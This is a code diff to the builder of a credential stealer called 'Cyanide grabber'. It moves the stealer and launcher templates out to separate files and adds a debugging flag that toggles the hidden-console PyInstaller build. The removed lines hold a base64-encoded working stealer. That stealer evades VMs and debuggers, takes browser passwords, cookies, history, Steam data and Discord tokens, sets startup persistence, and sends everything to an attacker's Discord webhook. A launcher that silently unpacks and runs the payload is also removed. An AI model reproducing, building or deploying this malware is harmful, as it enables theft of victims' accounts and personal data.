@@ -9,40 +9,9 @@ from core.logs import banner
 
 from colorama import Fore
 from base64 import standard_b64encode as b64encode
-from base64 import standard_b64decode as b64decode
 
-launcher = r"""import tempfile
-import os
-import base64
-
-from zipfile import ZipFile
-
-temp = tempfile.NamedTemporaryFile("wb", delete=False, suffix=".zip")
-
-dirtemp = "WindowsStyle"
-dirtempPath = os.path.join( os.path.dirname(os.path.abspath(temp.name)), dirtemp )
-
-base64zip = %b64zip%
-filexec = %filexec%
-password = %password%
-
-try:
-    temp.write(base64.standard_b64decode(base64zip))
-finally:
-    temp.close()
-
-    if not os.path.exists(dirtempPath): os.mkdir(dirtempPath)
-
-    with ZipFile(temp.name, "r") as archive:
-        archive.setpassword(password)
-        archive.extractall(dirtempPath)
-
-
-    os.system(os.path.join(dirtempPath, filexec))
-    os.remove(temp.name)"""
-
-mainApp = r"aW1wb3J0IG9zCmltcG9ydCB2ZGYKaW1wb3J0IGpzb24KaW1wb3J0IG51a2VsaWIKaW1wb3J0IHppcGZpbGUKaW1wb3J0IGlvCgpmcm9tIGNvcmUuY29tcG9uZXRzIGltcG9ydCBleHRyYWN0b3IKZnJvbSBjb3JlLmNvbXBvbmV0cyBpbXBvcnQgYW50aXZtCmZyb20gY29yZS5jb21wb25ldHMgaW1wb3J0IHN5c2luZm8KZnJvbSBjb3JlLmNvbXBvbmV0cyBpbXBvcnQgdG9rZW5ncmFiYmVyCgpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmZyb20gZGlzY29yZF93ZWJob29rIGltcG9ydCBEaXNjb3JkRW1iZWQsIERpc2NvcmRXZWJob29rCgpjbGFzcyBNYWluOgogICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgc2VsZi53ZWJob29rID0gRGlzY29yZFdlYmhvb2sodXJsPScld2ViaG9vayUnLCB1c2VybmFtZT0iQ3lhbmlkZSIsIGF2YXRhcl91cmw9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNjMyMTgxOTEyNTk2NzY3MDIvMTA4NDkxNjQ1OTY0NzU0OTU0MC9DeWFuaWRlLnBuZyIpCgogICAgZGVmIGFudGl2bShzZWxmKToKICAgICAgICBhbnRpdm0uQW50aXZtLnJ1bigpCiAgICAgICAgYW50aXZtLkFudGlkYmcucHJvY19jaGVjaygpCiAgICAgICAgYW50aXZtLkFudGlkYmcuZGxsX2NoZWNrKCkKCiAgICAgICAgYW50aXZtLkFudGlkYmcucHJvY2Vzc19jaGVjaygpCgogICAgZGVmIGNyZWRzSW50b2RpY3Qoc2VsZiwgY3JlZHM6IGxpc3QpOgogICAgICAgIGRhdGFCdWZmZXIgPSB7fQogICAgICAgIGZvciBjZWxsIGluIGNyZWRzOgogICAgICAgICAgICBkYXRhQnVmZmVyLnVwZGF0ZShjZWxsKQogICAgICAgIAogICAgICAgIHJldHVybiBqc29uLmR1bXBzKGRhdGFCdWZmZXIsIGluZGVudD0zKQoKICAgIGRlZiBicm93c2VyKHNlbGYpOgogICAgICAgIGNyZWRzID0gW10KICAgICAgICBmb3Iga2V5IGluIGV4dHJhY3Rvci5icm93c2Vyc19wcm9maWxlOgogICAgICAgICAgICBicm93c2VyID0gZXh0cmFjdG9yLmJyb3dzZXJzX3Byb2ZpbGVba2V5XQoKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoYnJvd3Nlcik6CiAgICAgICAgICAgICAgICBwcm9maWxlcyA9IFsiRGVmYXVsdCJdCgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihicm93c2VyKToKICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkuc3RhcnRzd2l0aCgicHJvZmlsZSIpOgogICAgICAgICAgICAgICAgICAgICAgICBwcm9maWxlcy5hcHBlbmQoZmlsZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIHByb2ZpbGUgaW4gcHJvZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgZXh0cmFjdGlvbiA9IGV4dHJhY3Rvci5FeHRyYWN0KG9zLnBhdGguam9pbihicm93c2VyLCAiTG9jYWwgU3RhdGUiKSkKICAgICAgICAgICAgICAgICAgICBwYXNzd2RzID0gZXh0cmFjdGlvbi5leHRyYWN0UGFzc3dvcmRzKG9zLnBhdGguam9pbihicm93c2VyLCBwcm9maWxlLCAiTG9naW4gRGF0YSIpKQogICAgICAgICAgICAgICAgICAgIGhpc3RvcnkgPSBleHRyYWN0aW9uLmV4dHJhY3RIaXN0b3J5KG9zLnBhdGguam9pbihicm93c2VyLCBwcm9maWxlLCAiSGlzdG9yeSIpKQogICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBleHRyYWN0aW9uLmV4dHJhY3RDb29raWVzKG9zLnBhdGguam9pbihicm93c2VyLCBwcm9maWxlKSkKCiAgICAgICAgICAgICAgICAgICAgc3VtbWFyeSA9IHticm93c2VyOiB7IlBhc3N3b3JkcyI6IHBhc3N3ZHMsICJIaXN0b3J5IjogaGlzdG9yeSwgIkNvb2tpZXMiOiBjb29raWVzfX0KCiAgICAgICAgICAgICAgICAgICAgY3JlZHMuYXBwZW5kKHN1bW1hcnkpCgogICAgICAgIGZvciBrZXkgaW4gZXh0cmFjdG9yLmJyb3dzZXJzOgogICAgICAgICAgICBicm93c2VyID0gZXh0cmFjdG9yLmJyb3dzZXJzW2tleV0KCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGJyb3dzZXIpOgogICAgICAgICAgICAgICAgZXh0cmFjdGlvbiA9IGV4dHJhY3Rvci5FeHRyYWN0KG9zLnBhdGguam9pbihicm93c2VyLCAiTG9jYWwgU3RhdGUiKSkKICAgICAgICAgICAgICAgIHBhc3N3ZHMgPSBleHRyYWN0aW9uLmV4dHJhY3RQYXNzd29yZHMob3MucGF0aC5qb2luKGJyb3dzZXIsICJMb2dpbiBEYXRhIikpCiAgICAgICAgICAgICAgICBoaXN0b3J5ID0gZXh0cmFjdGlvbi5leHRyYWN0SGlzdG9yeShvcy5wYXRoLmpvaW4oYnJvd3NlciwgIkhpc3RvcnkiKSkKICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBleHRyYWN0aW9uLmV4dHJhY3RDb29raWVzKG9zLnBhdGguam9pbihicm93c2VyKSkKCiAgICAgICAgICAgICAgICBzdW1tYXJ5ID0ge2Jyb3dzZXI6IHsiUGFzc3dvcmRzIjogcGFzc3dkcywgIkhpc3RvcnkiOiBoaXN0b3J5LCAiQ29va2llcyI6IGNvb2tpZXN9fQoKICAgICAgICAgICAgICAgIGNyZWRzLmFwcGVuZChzdW1tYXJ5KQogICAgICAgIAogICAgICAgIHJldHVybiBjcmVkcwogICAgCiAgICBkZWYgc3RlYW0oc2VsZik6CiAgICAgICAgc3RlYW1Vc2Vyc0NvbmYsIHN0ZWFtQ29uZmlnRGF0YSA9IE5vbmUsIE5vbmUKCiAgICAgICAgc3RlYW1Vc2VycyA9IG9zLnBhdGguYWJzcGF0aChvcy5wYXRoLmpvaW4ob3Muc2VwLCAiUHJvZ3JhbSBGaWxlcyAoeDg2KSIsICJTdGVhbSIsICJjb25maWciLCAibG9naW51c2Vycy52ZGYiKSkKICAgICAgICBzdGVhbUNvbmZpZyA9IG9zLnBhdGguYWJzcGF0aChvcy5wYXRoLmpvaW4ob3Muc2VwLCAiUHJvZ3JhbSBGaWxlcyAoeDg2KSIsICJTdGVhbSIsICJjb25maWciLCAiY29uZmlnLnZkZiIpKQogICAgICAgIHN0ZWFtVXNlckRhdGFfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChvcy5wYXRoLmpvaW4ob3Muc2VwLCAiUHJvZ3JhbSBGaWxlcyAoeDg2KSIsICJTdGVhbSIsICJ1c2VyZGF0YSIpKQoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGVhbVVzZXJzKToKICAgICAgICAgICAgd2l0aCBvcGVuKHN0ZWFtVXNlcnMsICJyIikgYXMgZjoKICAgICAgICAgICAgICAgIHN0ZWFtVXNlcnNDb25mID0gdmRmLmxvYWRzKGYucmVhZCgpKQoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGVhbUNvbmZpZyk6CiAgICAgICAgICAgIHdpdGggb3BlbihzdGVhbUNvbmZpZywgInIiKSBhcyBmOgogICAgICAgICAgICAgICAgc3RlYW1Db25maWdEYXRhID0gdmRmLmxvYWRzKGYucmVhZCgpKQoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGVhbVVzZXJEYXRhX3BhdGgpOgogICAgICAgICAgICBidWZmZXIgPSBpby5CeXRlc0lPKCkKICAgICAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoYnVmZmVyLCAidyIpIGFzIGNvbmZpZ3ppcDoKICAgICAgICAgICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHN0ZWFtVXNlckRhdGFfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVQYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpZ3ppcC53cml0ZShmaWxlUGF0aCwgb3MucGF0aC5yZWxwYXRoKGZpbGVQYXRoLCBzdGVhbVVzZXJEYXRhX3BhdGgpKQogICAgICAgICAgIAogICAgICAgICAgICBzZWxmLndlYmhvb2suYWRkX2ZpbGUoYnVmZmVyLmdldHZhbHVlKCksICJzdGVhbVVzZXJEYXRhLnppcCIpCgogICAgICAgIHJldHVybiBzdGVhbVVzZXJzQ29uZiwgc3RlYW1Db25maWdEYXRhOwogICAgICAgIAogICAgZGVmIGFkZFN0YXJ0dXAoc2VsZiwgbGlua25hbWU6IHN0ciwgcGF0aEV4ZWM6IHN0cik6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJBUFBEQVRBIl0sICJNaWNyb3NvZnQiLCAiV2luZG93cyIsICJTdGFydCBNZW51IiwgIlByb2dyYW1zIiwgIlN0YXJ0dXAiLCBsaW5rbmFtZSkpOgogICAgICAgICAgICBzY3JpcHQgPSBmIiIiCiAgICAgICAgICAgICRzaCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXU2NyaXB0LlNoZWxsCiAgICAgICAgICAgICR1c2VyU3RhcnR1cEZvbGRlclBhdGggPSBbRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCJTdGFydHVwIikKICAgICAgICAgICAgJHNob3J0Y3V0RmlsZSA9ICRzaC5DcmVhdGVTaG9ydGN1dCgiJHVzZXJTdGFydHVwRm9sZGVyUGF0aFx7bGlua25hbWV9LmxuayIpCiAgICAgICAgICAgICRzaG9ydGN1dEZpbGUuVGFyZ2V0UGF0aCA9ICJ7cGF0aEV4ZWN9IgogICAgICAgICAgICAkc2hvcnRjdXRGaWxlLlNhdmUoKQogICAgICAgICAgICAiIiIKICAgICAgICAgICAgc3lzaW5mby5ydW5Qb3dlcnNoZWxsKHNjcmlwdCkKCgogICAgZGVmIHRva2VuKHNlbGYpOgogICAgICAgIGV4dHJhY3Rvci5BbnRpX3Rva2VucHJvdGVjdG9yLmtpbGxwcm90ZWN0b3IoKQogICAgICAgIHRva2VucyA9IHRva2VuZ3JhYmJlci5leHRyYWN0X3Rva2VucygpLnRva2VucwogICAgICAgIAogICAgICAgIHJldHVybiB0b2tlbnMKCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIFRocmVhZCh0YXJnZXQ9c2VsZi5hbnRpdm0pLnN0YXJ0KCkKICAgICAgICBzZWxmLmFkZFN0YXJ0dXAoIk15QXBwIiwgb3MucGF0aC5hYnNwYXRoKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykpKQogICAgICAgIAogICAgICAgIHVzZXJDb25maWcsIHN0ZWFtQ29uZmlnID0gc2VsZi5zdGVhbSgpCiAgICAgICAgbGlzdENyZWRzID0gc2VsZi5icm93c2VyKCkKICAgICAgICB0b2tlbnMgPSBzZWxmLnRva2VuKCkKCiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICAgICAgdXNlcmluZm8gPSBudWtlbGliLmFjY291bnRfaW5mbyh0b2tlbikKICAgICAgICAgICAgCiAgICAgICAgICAgICMgaWNvbiB1cmwgbm90IHdvcmsKICAgICAgICAgICAgZW1iZWQgPSBEaXNjb3JkRW1iZWQodGl0bGU9dXNlcmluZm9bInVzZXJuYW1lIl0sIGljb25fdXJsPWYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97dXNlcmluZm9bJ2lkJ119L3t1c2VyaW5mb1snYXZhdGFyJ119LnBuZyIsIGNvbG9yPSI2NTYxNjYiKQogICAgICAgICAgICBlbWJlZC5hZGRfZW1iZWRfZmllbGQobmFtZT0nVG9rZW4nLCB2YWx1ZT10b2tlbikKICAgICAgICAgICAgZW1iZWQuYWRkX2VtYmVkX2ZpZWxkKG5hbWU9J0xvY2FsZScsIHZhbHVlPXVzZXJpbmZvWyJsb2NhbGUiXSkKICAgICAgICAgICAgZW1iZWQuYWRkX2VtYmVkX2ZpZWxkKG5hbWU9J0VtYWlsJywgdmFsdWU9dXNlcmluZm9bImVtYWlsIl0pCiAgICAgICAgICAgIGVtYmVkLmFkZF9lbWJlZF9maWVsZChuYW1lPSdQaG9uZScsIHZhbHVlPXVzZXJpbmZvWyJwaG9uZSJdKQogICAgICAgICAgICBlbWJlZC5hZGRfZW1iZWRfZmllbGQobmFtZT0nVmVyaWZpZWQnLCB2YWx1ZT1zdHIodXNlcmluZm9bInZlcmlmaWVkIl0pKQogICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0J5IEN5YW5pZGUgZ3JhYmJlcicpCgogICAgICAgICAgICBlbWJlZC5zZXRfdGltZXN0YW1wKCkKCiAgICAgICAgICAgIHNlbGYud2ViaG9vay5hZGRfZW1iZWQoZW1iZWQpCgogICAgICAgIGVtYmVkID0gRGlzY29yZEVtYmVkKHRpdGxlPSdSZXBvcnQnLCBjb2xvcj0iNjU2MTY2IikKICAgICAgICBlbWJlZC5hZGRfZW1iZWRfZmllbGQobmFtZT0nVG9rZW5zJywgdmFsdWU9ZiIiImBgYHt0b2tlbnN9YGBgIiIiKQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nQnkgQ3lhbmlkZSBncmFiYmVyJykKICAgICAgICBzZWxmLndlYmhvb2suYWRkX2ZpbGUoZmlsZT12ZGYuZHVtcHModXNlckNvbmZpZywgVHJ1ZSkuZW5jb2RlKCksIGZpbGVuYW1lPSJTdGVhbVVzZXJzQ29uZmlnLnR4dCIpCiAgICAgICAgc2VsZi53ZWJob29rLmFkZF9maWxlKGZpbGU9dmRmLmR1bXBzKHN0ZWFtQ29uZmlnLCBUcnVlKS5lbmNvZGUoKSwgZmlsZW5hbWU9IlN0ZWFtQ29uZmlnLnR4dCIpCiAgICAgICAgc2VsZi53ZWJob29rLmFkZF9maWxlKGZpbGU9c2VsZi5jcmVkc0ludG9kaWN0KGxpc3RDcmVkcykuZW5jb2RlKCksIGZpbGVuYW1lPSJQYXNzd29yZHMuSGlzdG9yeS5Db29raWVzLnR4dCIpCiAgICAgICAgc2VsZi53ZWJob29rLmFkZF9lbWJlZChlbWJlZCkKICAgICAgICByID0gc2VsZi53ZWJob29rLmV4ZWN1dGUoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIFRocmVhZCh0YXJnZXQ9TWFpbigpLnJ1bikuc3RhcnQoKQ=="
-
+stealerPath = os.path.join("core", "template", "main.tpl")
+launcherPath = os.path.join("core", "template", "launcher.tpl")
 
 def get_random_string(length=10) -> bytes:
     letters = string.ascii_lowercase
@@ -62,8 +31,10 @@ def zipfolder(foldername, target_dir, password: bytes):
 @click.command()
 @click.argument("webhook", required=1, type=str)
 @click.option('-o', "--output", type=str, required=1, help="Output file")
+@click.option('-o', "--output", type=str, help="Output file")
+@click.option('--debugging', is_flag=True)
 
-def builder(webhook, output):
+def builder(webhook, output, debugging):
     password = get_random_string(20)
 
     stealerpy = output+".py"
@@ -74,8 +45,9 @@ def builder(webhook, output):
     banner.builder()
     print(f"{'-'*30} Configure Cyanide... {'-'*30}")
     
-    print(f"[{Fore.GREEN}${Fore.RESET}] Adding webhook...")
-    template = b64decode(mainApp.encode()).decode().replace(r"%webhook%", webhook)
+    with open(stealerPath, "r") as f:
+        print(f"[{Fore.GREEN}${Fore.RESET}] Adding webhook...")
+        template = f.read().replace(r"%webhook%", webhook)
     
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
     
@@ -83,7 +55,11 @@ def builder(webhook, output):
         f.write(template)
     
     print(f"{'-'*30} Compiling Cyanide... {'-'*30}")
-    os.system("pyinstaller --noconsole "+stealerpy)
+    if debugging:
+        os.system("pyinstaller "+stealerpy)
+    else:
+        os.system("pyinstaller --noconsole "+stealerpy)
+
     os.remove(stealerpy)
 
     print(f"{'-'*30} Configure launcher... {'-'*30}")
@@ -94,16 +70,22 @@ def builder(webhook, output):
     os.remove(stealerzip)
 
     print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
-    template = launcher.replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
-    template = template.replace(r"%password%", 'b"'+password.decode()+'"')
-    template = template.replace(r"%filexec%", '"'+output+".exe"+'"')
+    with open(launcherPath, "r") as f:
+        template = f.read().replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
+        template = template.replace(r"%password%", 'b"'+password.decode()+'"')
+        template = template.replace(r"%filexec%", '"'+output+".exe"+'"')
     
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing launcher...")
     with open(launcherpy, "w") as f:
         f.write(template)
     
     print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
-    os.system("pyinstaller --onefile --noconsole "+launcherpy)
+    
+    if debugging:
+        os.system("pyinstaller --onefile "+launcherpy)
+    else:
+        os.system("pyinstaller --onefile --noconsole "+launcherpy)
+    
     os.remove(launcherpy)
     shutil.move(os.path.join("dist", output+".exe"), ".")
 
